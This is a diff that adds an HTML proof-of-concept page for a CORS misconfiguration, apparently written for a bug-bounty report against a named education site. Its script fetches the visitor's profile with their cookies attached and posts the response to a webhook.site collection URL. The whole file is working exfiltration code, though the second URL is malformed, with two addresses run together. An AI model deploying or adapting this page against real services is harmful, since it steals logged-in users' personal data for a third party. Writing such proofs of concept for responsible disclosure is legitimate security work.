@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://plato.varsitylive.in/users/profile", {
+        method: "GET",
+        credentials: "include",
+        headers: {
+          "Origin": "https://webhook.site/c646a8e6-efc4-42c2-a049-0f7767dd413c"
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        fetch("https://webhook.site/c646a8e6-efc4-42c2-a049-0f7767dd413c https://varsitylive.zerodha.com ", {
+          method: "POST",
+          body: data,
+          mode: "no-cors"
+        });
+      });
+    </script>
+    <h3>CORS PoC Executed. Check Webhook.</h3>
+  </body>
+</html>
